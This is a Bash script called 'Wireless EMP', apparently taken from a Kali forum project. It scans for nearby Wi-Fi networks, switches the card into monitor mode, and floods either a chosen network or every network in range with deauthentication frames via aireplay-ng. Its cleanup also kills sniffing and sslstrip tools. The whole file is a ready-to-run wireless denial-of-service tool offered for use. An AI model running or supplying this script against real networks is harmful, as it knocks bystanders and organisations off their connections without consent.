#!/bin/bash

#######################
# WIRELESS EMP (WEMP) #
#######################

# Authors
# Originally created by Nadav Cohen, 2015
#   Some of his code (mainly in the attack and quit functions) still remains
# The majority of the code present now was added or modified by Gregory Conrad, 2017

# License
# Unfortunately, it appears that Nadav Cohen did not license his code.
# See here for his original post: https://forums.kali.org/showthread.php?27257-MobileEMP-New-tool-to-knock-wireless-devices-off-networks
#
# My additions and modifications to the code are under the LGPL v3, or a later version if you so desire:
#
#    Copyright 2017 Gregory Conrad
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

#############
# FUNCTIONS #
#############
#Log functions
info() { printf "[INFO] $1\n" ; }
err() { printf "[ERROR] $1\n" ; }
#The actual attack function
attack() {
    interface=$1
    monitor="$interface"mon
    ssid=$2
    channel=$3
    requestNum=$4
    info "Putting $interface into monitor mode ($monitor) with channel $channel"
    airmon-ng start $interface $channel
    info "Attacking $ssid"
    aireplay-ng --deauth $requestNum -e $ssid -h $mac $monitor
    airmon-ng stop $monitor
}
#Quit function
quit() {
    info "Cleaning up..."
    killall -q airbase-ng aireplay-ng ferret hamster sslstrip
    airmon-ng stop "$interface"mon
	ifconfig $interface up
	service NetworkManager start
	info "Clean up finished. Good bye"
	if (( $# == 1 ))
	then
	    exit $1
	else
	    exit 0
	fi
}

###############
# MAIN SCRIPT #
###############
#Check arg number
if [ "$#" != "2" -a "$#" != "3" ]
then
    err "A wrong number of arguments was given"
    info "How to run this script:"
    info "$0 <interface> <numberOfRequests> [ssid]"
    info "[ssid] is an optional argument"
    info "Terminating..."
    exit 1
fi

#Greeting message
info "################"
info "# Wireless EMP #"
info "################\n"

#Initialize
info "Initializing..."
trap quit EXIT # trap exit
interface="$1"
requestNum="$2"
iwlistOut="`iwlist $interface scanning | tr '\n' ' ' | expand`"
read -r -a iwlistOutArray <<< "$iwlistOut"
airmon-ng check kill
ifconfig $interface up
mac=$(macchanger -s $interface|grep Current|awk '{ print $3 }')

#Parse iwlistOutArray
ssids=()
channels=()
ssidLastUsed=""
for str in "${iwlistOutArray[@]}"
do
    if [[ "$str" == "ESSID:"* && "$ssidLastUsed" != "true" ]]
    then
        newstr=`echo "$str" | cut -d \" -f2`
        ssids+=($newstr)
        ssidLastUsed=true
    elif [[ "$str" == "Channel:"* && "$ssidLastUsed" == "true" ]]
    then
        newstr=`echo "$str" | cut -d ':' -f2`
        channels+=($(($newstr)))
        ssidLastUsed=false
    fi
done

#Check to make sure both arrays are the same length
if [ ${#ssids[@]} -ne ${#channels[@]} ]
then
    err "An error occured while scanning for nearby networks"
    info "Terminating..."
    quit 2
fi
length=${#ssids[@]}

#Check to see if user gave an ssid
if [ "$#" == "3" ]
then
    ssid="$3"
    #See if given ssid is in ssids
    for (( i=0; i<$length; i++ ))
    do
        #If so, launch attack and quit
        if [[ "${ssids[$i]}" == "$ssid" ]]
        then
            info "Attacking $ssid in 10 seconds"
            info "Hit CTRL+C to abort"
            sleep 10
            attack "$interface" "$ssid" "${channels[$i]}" $requestNum
            quit
        fi
    done
else
    info "It looks like we have $length network(s)"
    info "Starting the attack in 10 seconds"
    info "Hit CTRL+C to abort"
    sleep 10
    info "Attacking network(s)"
    #For each network, launch the attack
    for (( i=0; i<$length; i++ ))
    do
        attack "$interface" "${ssids[$i]}" "${channels[$i]}" $requestNum
    done
fi
quit